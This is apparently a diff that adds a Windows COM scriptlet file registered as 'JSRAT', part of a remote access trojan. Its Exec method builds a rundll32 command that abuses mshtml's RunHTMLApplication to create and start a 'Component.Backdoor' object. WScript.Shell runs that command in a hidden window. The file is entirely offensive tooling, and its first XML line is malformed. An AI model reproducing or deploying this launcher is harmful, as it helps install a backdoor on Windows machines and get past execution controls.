@@ -1,0 +1,28 @@
+?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Component"
+    progid="JSRAT"
+    version="1.01"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}"
+>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+	
+	function Exec()
+	{
+		rat="rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Main();";
+		new ActiveXObject("WScript.Shell").Run(rat,0,true);
+//		return rat;
+	}
+	
+]]>
+</script>
+
+</scriptlet>
